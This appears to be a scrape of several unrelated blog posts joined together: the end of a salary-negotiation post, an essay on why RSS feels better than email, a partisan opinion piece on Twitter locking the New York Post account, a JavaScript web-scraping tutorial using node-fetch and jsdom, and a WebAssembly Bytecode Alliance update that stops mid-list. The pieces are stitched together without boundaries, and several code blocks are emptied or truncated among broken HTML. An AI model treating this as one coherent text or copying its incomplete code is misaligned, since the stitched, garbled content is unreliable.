leaves you with a <em>boatload</em> of money on the table. Suppose, for a moment, that your skillset is one that this company desperately needs. As a result, your skillset is likely delivering way more value to that prospective employer at the margin. This means it’s a good idea for them to <em>pay you more money</em> to do your thing for them. By telling them what you get paid now, you peg the start of negotiations to that number, and give them a <em>huge discount</em> on your <em>very valuable</em> services.</p><p>Enough rambling about negotiating, and on to some practical advice! I’ve found a great turnabout phrase for being asked your salary history, or your salary expectations. Here’s what I’ve got:</p><blockquote><p>“I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p></blockquote><p>This is an excellent response, for three reasons.</p><ol><li>It offers no information <em>at all</em> about your current compensation.</li><li>It puts the person who asked you at an informational disadvantage. It shows that your counterparty is getting closer to a “yes”. Prioritizing good mutual fit in your response telegraphs to them that you are not convinced yet. This is a better negotiating position for you: making them work to convince you gives you <em>leverage.</em></li><li>It frequently yields a response in the form of the salary range that the employer is working with. I suspect this is out of a combination of surprise at being asked, and wanting to help make a good impression with you, the candidate, after learning that they haven’t convinced you to join yet.</li></ol><p>Got any other hot tips and tricks for salary negotiation? I’d love to hear them.</p><p>Also - that link I included above to Patrick McKenzie’s <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">blog post on salary negotiation</a>? Go read it. It’s excellent, and it <em>will</em> make you more money.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4>Or, What RSS Gets Right</h4>
<p>Abraham Lincoln once said, "<a href="https://en.wikipedia.org/wiki/Marshall_McLuhan">The medium is the message</a>. And San Francisco summers are cold af."</p>
<p>Putting that aside, I've been thinking a lot (uh-oh) about why I like opening up my RSS reader app so much. And I'm not <em>just</em> talking about its looks, even though it's super cute (I'm using the free, open-source, and all-around neato <a href="https://ranchero.com/netnewswire/">NetNewsWire</a> for my RSS needs).</p>
<p>No, I'm talkin' about them RSS <em>feels</em>.</p>
<p>Why does using opening my RSS inbox feel so much better than typing in gmail.com or tapping the iMessages icon or, heavens forbid, opening up Twitter?</p>
<p>With my sweet-sweet RSS, there's no anxiety. There's no guilt. In our time-tracking Screen Time home screen widget era, there's almost a baccanalian decadance to sifting through an RSS inbox, like watching honey drip from one of those wooden combs in a cereal commercial. Or -- back when we were allowed -- going to the library and reading the newspaper from those weird wooden dowels.</p>
<p>It should go without saying that this feeling does not extend to the other inboxen in my life. And I'd like to understand why -- and see if I can do anything about it.</p>
<h2>A framework for messages</h2>
<p>Butchering some data pipeline terms, let's define an inbox (e.g. email, social media, text messages, RSS, phone calls) as a sink for messages from various data providers, where these messages wait for human-in-the-loop processing (in this case, you).</p>
<p>O! Ye of little time! How are you meant to evaluate the "importance" of a given message? Let's explore that across two vectors: (1) prior awareness of the message's sender and (2) usefulessness of the message contents.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a1792/msggrid.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>The sweet-spot is that upper row: useful messages from both "people we know" and "people we don't know." Whereas if you're in the bottom row, you're gonna have a bad time: useless messages are never... useful.</p>
<h4>Filtering on sender</h4>
<p>The bottom right quadrant is easy to visualize: robo-calls about your non-existent car's expired warranty, social media ads, junk mailers in your meatspace mailbox. </p>
<p>You might think, perhaps, that we can use the "Expected Sender" vs "Unexpected Sender" filter to avoid this quadrant. In fact, this is what Apple allows you to do with the new <a href="https://support.apple.com/en-us/HT207099#:~:text=To%20turn%20on%20Silence%20Unknown,in%20your%20recent%20calls%20list.">Silence Unknown Callers</a> feature in iOS 14 (which doesn't actually prevent the calls, but immediately sends unknown calls to the dead-letter queue that is your voicemailbox).</p>
<p>The problem with this blunt approach of dead-letter queueing the right column is that you're going to miss the serendipity of the upper right quadrant: calls from unexpected sources with useful information. Given <a href="https://www.charlieharrington.com/colon-cancer">my recent cancer diagnosis</a>, I've had tons of important, useful calls from unknown numbers every single day, from doctors and the like -- calls that I want to triage quickly. Sending all calls from unknown numbers straight to voicemail would just be yet another inbox to maintain. Worse, I might miss something important in the upper right quadrant.</p>
<p>A lighter touch approach here is to auto-classify your messages into buckets based on sender. Gmail now does this with their "Primary", "Social", and "Promotion" tabs. Everything's still "in your inbox", but now you can usually just "Select all" on that Promotion tab and safely send those messages straight to the netherworld.</p>
<p>The bottom left quadrant is where your unique lifeforce is slowly chipped away, doomscrolling through your high school classmates' life updates or, gasp, political views. Don't get me wrong -- I really enjoy Instagram and it makes me happy to see people I know doing cool, cute stuff. But I know it can get real bad in this quadrant real quick. Unfollowing and/or muting is key here.</p>
<h4>Filtering on content</h4>
<p>Okay, so, if filtering on sender alone doesn't work, can we use the message contents to figure out if a given message is going to be useful?</p>
<p>We're now talking about <em>pre-processing</em> the messages in our queues.</p>
<p>In the days of future past, you might have employed a staffer to "sort through your office mailbox" to do this. How very Don Draper of you. But in today's era of secure password managers and 2FA, we ideally don't have <em>that many</em> other people in our digital inboxes. The inbox providers are aware of this, and they're starting to provide some tools to help here -- as long as you're okay with them "reading" your messages.</p>
<p>Gmail, for example, has gotten pretty darn good at spam detection. They're "reading your emails" and dropping the bad ones into your "spam folder" dead-letter queue. Maybe, once in a blue moon, they false-positive something that you have to go spelunking into that elephant graveyard to find. But I'm never annoyed by this, because when I see absolute garbage that they've blocked for me day-in and day-out, I'm hashtag grateful again.</p>
<p>This approach, however, isn't possible with all mediums. There's no way to pre-filter on content for an incoming phone-call, for example.</p>
<p>And the tradeoff in pre-filtering on content is, of course, privacy. </p>
<p>If you're down for your inbox provider to "scan" your messages, then they can potentially start to do some smart stuff, like "bubbling up" useful messages or getting rid of bottom row crud.</p>
<p>But, more likely than not, they're also reading them for another purpose.</p>
<h4>The cost of free</h4>
<p>Many of these inbox platforms are free (e.g. social media, Gmail), and someone's gotta pay to keep that spam algorithm ticking. And that someone is you.</p>
<p>Most ads are squarely in the bottom right quadrant. "Good" ads -- I'm talking about those Instagram candles you keep converting on -- are upper right quadrant. The platforms do their darndest to make sure their ads are as upper-right as possible, but they can't guarantee that. YouTube keeps asking me my age because it's genuinely confused as to why my viewing habits fluctuate between watching someone clean old Apple II and VIC-20 computers and the latest Super Mario 3 speed-runs. </p>
<p>And, c'mon, I'd rather just not ever see ads in the first place.</p>
<p>Okay, tough guy. Are you willing to pay for an ad-free inbox then?</p>
<p>Maybe? Ugh. Yes, there's a bunch of new players in the space who are emphasizing privacy and going ad-free. But am I going to willingly add yet another recurring subscription to my life? The Mandalorian is about to come back, and I'm already bracing for the impending Disney+ subscription. </p>
<p>I'll come back to this, because our analysis is still missing two important features.</p>
<h2>A framework for inboxen</h2>
<p>So, far we've only explored the features of an individual message -- not the nature of an inbox itself.</p>
<p>Regardless of an individual message's usefuless or your prior awareness of its sender, an inbox has two other important features that contribute to our mental well-being: (1) typical message volume and (2) expected urgency of triage.</p>
<p><span>

  </a>
    </span></p>
<p>The message volume thing is straightforward. Some platforms have a never-ending feed of messages that you can "enjoy," others not so much.</p>
<p>At the same time, each inbox medium connotes a inherent sense of urgency. <strong>The medium is the madness</strong>, if you will. No matter what the message says or who sends it, there's a differentiated inbox-level "urgency punch" to your lizard brain whenever any single message (spam or not) comes flying in.</p>
<p>Let's be more specific with some typical inboxes in our lives:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>Phone calls are just about as "urgent" as it gets. Prior to iOS 14, phone calls used to interrupt whatever you were doing, taking up your iPhone's entire screen real estate. Doesn't get more urgent-y than that! Luckily, calls are relatively sparse compared to text messages, which you still need to respond to, but you can "put them on ice" for days at a time with a high-degree of cultural acceptance.</p>
<p>Social media messages are legion in terms of volume. And, while they're not especially urgent from an innate message-level perspective, the platforms do their darndest to "notify" you of "engagement opportunities" to keep you locked-in, so these inboxes fall in the semi-urgent category in my book.</p>
<p>Onto RSS -- my beautiful, dark, twisted RSS. There's truly zero urgency here and relatively few messages (writing blog posts is time-consuming!). Moreover, returning to our message evaluation framework, an RSS inbox only contains messages from known senders, since you've explicitly had to add their RSS feeds to your feed-roll. And, since you've likely done that because you expect to value the contents of their messages, you're likely living in the upper left quadrant in RSS-land, enjoying that drizzled honey and those weird-newspaper rolls.</p>
<p>Email is the real challenge-tunity here.</p>
<h3>Stuck in the Middle With You</h3>
<p>Email is caught in the middle of all these features, both message-level and inbox-level. Anyone can email you at any time with any message, so there's a ton of it, and any message may be useful and/or urgent. That's mostly a good thing, and probably our RFC-writing forerunners wanted it that way.</p>
<p>Thus, we check our email, prodigiously, every single day. All day long. While we're pooping, while we're Zooming, while we're doing any old thing.</p>
<p>Perhaps this is a lens on why newsletters are making a comeback. Email readers are a "captive audience," because we cannot avoid triaging our email inboxes. As long as publishers keep their newsletters top-row-level useful, we'll keep Substacking them. Certainly, the chances of me reading an email newsletter are greater than they would be if I had to visit individual blogs. However, I think my ideal for premium content would be paid RSS feeds, rather than email newsletters, because I want to keep my email inbox clean as possible to aid in my triaging. In fact, this is what many podcasts are now doing (since podcasts are just noisy RSS feeds).</p>
<p>OK, enough about content-monetization (have I mentioned I have a free newsletter below?). How can we make our email inbox <em>feel</em> better? Is it possible to make email feel as good as RSS?</p>
<p>First, we should establish principles-slash-goals for each quadrant in our Conjoined Box of …</p></div></div>

<p><em>Disclaimer: I’m a registered voter with no party affiliation. I have a personal interest in tracking major news networks such as CNN, Fox News, Breitbart, the New York Times, and other outlets who publish misleading information since 2008. Twitter is a recent example of a large, influential medium that has now subjectively interfered with information flow to the public.</em></p>



<p>It has been over 10 days since the famous <a href="https://nypost.com/2020/10/14/hunter-biden-emails-show-leveraging-connections-with-dad-to-boost-burisma-pay/" target="_blank" rel="noreferrer noopener">New York Post story</a> discussing Hunter Biden’s activities with the Ukranian energy firm Burisma. Twitter reacted by locking the New York Post’s Twitter account from any activity, citing they were trying to prevent the spread of hacked information. Twitter CEO Jack Dorsey admits <a href="https://variety.com/2020/digital/news/twitter-ceo-nypost-block-wrong-hacked-materials-policy-1234807399/" target="_blank" rel="noreferrer noopener">blocking the story was a mistake</a> and ended up reallowing the sharing of the story on Twitter.</p>



<h3>Then one must ask, <em>why is the New York Post’s Twitter account still locked?</em></h3>



<p>If the decision was reversed, why isn’t the New York Post’s account unlocked? Why isn’t the New York Times account locked due to releasing Trump’s tax returns that were clearly stolen or “hacked”? Especially after the New York Times declined to share their evidence? Here’s a quote from the NYT article where they decline to share:</p>



<blockquote><p>“…Alan Garten, a lawyer for the Trump Organization, said that “most, if not all, of the facts appear to be inaccurate” and requested the documents on which they were based. After The Times declined to provide the records, in order to protect its sources…”</p><cite>https://www.nytimes.com/interactive/2020/09/27/us/donald-trump-taxes.html</cite></blockquote>



<p>So no records have been released “in order to protect sources”, which isn’t an explanation as to why the actual documents haven’t been published. You can publish tax returns without exposing your sources (for an example, look at <a href="https://wikileaks.org/" target="_blank" rel="noreferrer noopener">all of the WikiLeaks releases</a> over time). Ironically, by publishing the tax returns, you’ll force the hand of Trump to actually release his returns. Instead, all we have is the NYT claiming to have records that they won’t show and have obtained without permission.<strong> So why is the New York Post account locked and the NYT account not?</strong> </p>



<h3>A speculation</h3>



<p>Maybe the answer lies in Twitter’s rules and policies, which <a href="https://help.twitter.com/en/rules-and-policies/public-interest" target="_blank" rel="noreferrer noopener">give plenty of wiggle room</a> by utilizing “exceptions” that they alone determine is best for the public interest. Apparently unverified and unreleased tax returns are important for the public interest, but direct evidence of high-ranking US politician’s family member <a href="https://twitter.com/TrumpWarRoom/status/1196831901597806599?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1196831901597806599%7Ctwgr%5Eshare_3%2Ccontainerclick_1&amp;ref_url=https%3A%2F%2Fwww.breitbart.com%2Fpolitics%2F2019%2F11%2F19%2Fbackfire-vindman-admits-hunter-biden-seemed-unqualified-for-burisma-role%2F" target="_blank" rel="noreferrer noopener">receiving a highly paid position without prior credentials</a> is not of concern to the American public. </p>



<p>Maybe it turns out that Twitter is in fact biased? Considering it’s difficult, if not impossible for a human being to truly be entirely objective, Twitter’s review units are undoubtedly biased themselves since they’re made up of humans. Should there be insights into who makes up the committees that Twitter uses to review posts and their potential biases? Either way, the main question is; why are they subjectively trying to change the flow of information to the American public?</p>



<p>You’ll have to come to your own conclusion on that. </p>



<h3>To be transparent, this is my opinion.</h3>



<p>Any institution (private or public) with the power to influence outcomes of anything at scale, are incentivized to take a side. Since humans make up these institutions, they are inherently biased, no matter how hard they try to be unbiased. The resulting bias from the institution’s parts eventually come through as the bias of the whole institution. It’s inevitable and unavoidable, and this is what we’re seeing on Twitter’s decision to lock the New York Post’s account but not the New York Times.</p>



<p>The New York Post should be able to post their own articles without limitation unless other media outlets are restricted as well (such as BuzzFeed news). Unless every single news article is researched by a transparent committee with their justification on blocking/allowing it, one side will always benefit. </p>

<p>If you’ll try to google “web scraping tutorial” you’ll get a bunch of tech articles on the subject that tells you how to achieve the result using python. The toolkit is pretty standard for these posts: python 3 (hopefully not second) as an engine, requests library for fetching, and Beautiful Soup 4 (which is 6 years old) for web parsing.</p>
<p><em>I’ve also seen few articles where they teach you how to parse HTML content with regular expressions, spoiler: <a href="https://stackoverflow.com/a/1732454/7668392">don’t do this</a>.</em>

<p>The problem is that I’ve seen articles like this 5 years ago and this stack hasn’t mostly changed. And more importantly, the solution is not native to javascript developers. If you would like to use technologies you are more familiar with, like ES2020, node, and browser APIs you will miss the direct guidance.</p>
<p>I’ve tried to fill the spot and create ‘the missing doc’.</p>
<h2>Overview</h2>
<blockquote>
<h4>Check if data is available in request</h4>
<p>Before you will start to do any of the programming, always check for the easiest available way. In our case, it would be a direct network request for data.</p>
<p>Open developer tools - F12 in most browsers - then switch to the <code>Network</code> tab and reload the page</p>
<p>If data is not baked in the HTML like it is in half of the modern web applications, there is a good chance that you don’t need to scrape and parse at all.

<p>If you are not so lucky and still need to do the scraping, here is the general overview of the process:</p>
<ol>
<li>fetch the page with the required data</li>
<li>extract the data from the page markup to some in-language structure (Object, Array, Set)</li>
<li>process the data: filter it, transform it to your needs, prepare it for the future usage</li>
<li>save the data: write it to the database or dump it to the filesystem</li>
</ol>
<p>That would be the easiest case for parsing, in sophisticated ones you can bump into some pagination, link navigation, dealing with bot protection (captcha), and even real-time site interaction. But all this wouldn’t be covered in the current guide, sorry.</p>
<h2>Fetching</h2>
<p>As an example of this guide, we will scrape a goal data for Messi from Transfermarkt. You can check his stats <a href="https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1">on the site</a>. To load the page from the node environment you will need to use your favorite request library. You can also use the raw HTTP/S module, but it doesn’t even support async, so I’ve picked <a href="https://github.com/node-fetch/node-fetch"><code>node-fetch</code></a> for this task. Your code will look something like:</p>
<div data-language="js"><pre><code><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>'node-fetch'</span><span>)</span>

<span>const</span> <span>DATA_URL</span> <span>=</span>
  <span>'https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1'</span>
<span>const</span> <span>loadMessiGoals</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>DATA_URL</span><span>)</span>
  <span>return</span> response<span>.</span><span>text</span><span>(</span><span>)</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>loadMessiGoals<span>}</span></code></pre></div>
<h2>Tools for parsing</h2>
<p>There are two major alternatives for this task which are conveniently represented with two high-quality most-starred and alive libraries.</p>

    <figcaption>We will use one of them</figcaption>
  </figure>
<p>The first approach is just to build a syntax tree from a markup text and then navigate it with familiar browser-like syntax. This one is fully covered with <a href="https://github.com/cheeriojs/cheerio">cheerio</a> that declared as <code>jQuery for server</code> (IMO, they need to revise their marketing vibes for 2020).</p>
<p>The second way is to build the whole browser DOM but without a browser itself. We can do this with wonderful <a href="https://github.com/jsdom/jsdom">jsdom</a> which is <code>node.js implementation of many web standards</code>.</p>
<p>Let’s take a closer look at both of them.</p>
<h3>cheerio</h3>
<p>Despite these analogies cheerio doesn’t have jQuery in dependencies, it just tries to reimplement most known methods from scratch:</p>
<div data-language="json"><pre><code> <span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"@types/node"</span><span>:</span> <span>"^14.11.2"</span><span>,</span>
  <span>"css-select"</span><span>:</span> <span>"~3.1.0"</span><span>,</span>
  <span>"dom-serializer"</span><span>:</span> <span>"~1.1.0"</span><span>,</span>
  <span>"entities"</span><span>:</span> <span>"~2.1.0"</span><span>,</span>
  <span>"htmlparser2"</span><span>:</span> <span>"^5.0.0"</span><span>,</span>
  <span>"lodash"</span><span>:</span> <span>"^4.17.20"</span><span>,</span>
  <span>"parse5"</span><span>:</span> <span>"^6.0.0"</span><span>,</span>
  <span>"parse5-htmlparser2-tree-adapter"</span><span>:</span> <span>"^6.0.0"</span>
<span>}</span></code></pre></div>
<p>Basic usage is really easy:</p>
<ul>
<li>
<p>you load a HTML</p>
<div data-language="js"><pre><code><span>const</span> $ <span>=</span> cheerio<span>.</span><span>load</span><span>(</span><span>'&lt;ul id="steps"&gt;...&lt;/ul&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>done, you’re great, now you can use JQ selectors/methods</p>

</li>
</ul>
<p>Probably you can pick this one if you need to save on size (cheerio is lightweight and fast) or you are really familiar with jQuery syntax and for some reason want to bring it to your new project. Cheerio is a nice way to do any kind of work with HTML you need in your application.</p>
<h3>jsdom</h3>
<p>This one is a bit more complicated: it tries to emulate part of the whole browser that is working with HTML and JS (apart from rendering the result). It’s used heavily for testing and … well scraping.</p>
<p>Let’s spin up jsdom:</p>
<ul>
<li>
<p>you need to use a constructor with your HTML</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span><span>'&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>then you can access standard browser API</p>
<div data-language="js"><pre><code>dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelector</span><span>(</span><span>"p"</span><span>)</span><span>.</span>textContent</code></pre></div>
</li>
</ul>
<p>jsdom is a lot heavier and it does a lot more job. You should understand, why to choose it over other options.</p>
<h2>Parsing</h2>
<p>In our example, I want to stick to the jsdom. It will help us to show one last approach at the end of the article. The parsing part is really vital but very short.</p>
<p>So we’ll start with building a dom from the fetched HTML:</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span>goalsHTML<span>)</span></code></pre></div>
<p>Then you can select table content with css selector and browser API. Don’t forget to create a real array from <code>NodeList</code> that <code>querySelectorAll</code> returns.</p>
<div data-language="js"><pre><code><span>const</span> rows <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table tbody tr'</span><span>)</span>
<span>)</span></code></pre></div>
<p>Now you have a two-dimensional array to work with. This part is finished, now you need to process this data to get clean and ready-to-work-with stats.</p>
<h2>Processing</h2>
<p>First, let’s check the lengths of our rows. Each row is the stat about goal and we mostly don’t care how many do we have. But each row can contain numbers in a different format so we have to deal with them.</p>
<p>We map over rows and get the length. Then we deduplicate results to see what options do we have here.</p>
<div data-language="js"><pre><code><span>const</span> lengths <span>=</span> rows<span>.</span><span>map</span><span>(</span><span>row</span> <span>=&gt;</span> row<span>.</span>length<span>)</span>
<span>const</span> result <span>=</span> <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span>lengths<span>)</span><span>]</span>
</code></pre></div>
<p>Not that bad, only 4 different shapes: with 1, 5, 14, and 15 cells.

    </span>
    <figcaption>All the possible row cases</figcaption>
  </figure>
<p>Since we don’t need rank data from extra cell in 15-cells case it is safe to delete it.</p>
<div data-language="js"><pre><code><span>const</span> <span>omitRank</span> <span>=</span> <span>(</span><span>row</span><span>)</span> <span>=&gt;</span>
  row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row</code></pre></div>
<p>Row with only one cell is actually useless: it is just a name of the season, so we will skip it.</p>
<div data-language="js"><pre><code><span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> <span>null</span></code></pre></div>
<p>For the 5-cells case (when player scored few goals in one match) we need to find previous full row and use it’s data for empty stats.</p>
<div data-language="js"><pre><code><span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
  goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals<span>)</span>

<span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals<span>)</span>
<span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span></code></pre></div>
<p>Now we just have to manually map data to keys, nothing scientific here and no smart way to avoid it.</p>
<div data-language="js"><pre><code><span>return</span> <span>{</span>
  competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
  matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>

<span>}</span></code></pre></div>
<h2>Saving</h2>
<p>We would just dump our result to a file, converting it to a string first with the <code>JSON.stringify</code> method.</p>
<div data-language="js"><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><span>.</span>promises

<span>const</span> <span>saveStats</span> <span>=</span> <span>async</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span></code></pre></div>

<h2>Bonus: One-time parsing with a snippet</h2>
</blockquote>
<p>Since we used <code>jsdom</code> with the browser-compatible API we actually don’t need any node environment to parse the data. If we just need it once from a particular page we can just run some code at the <code>Console</code> tab in the developers tools of your browser. Try to open <a href="https://www.transfermarkt.com/cristiano-ronaldo/alletore/spieler/8198/plus/1">any player stats on Transfermarkt</a> and paste this giant non-readable snippet to the console:</p>

    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
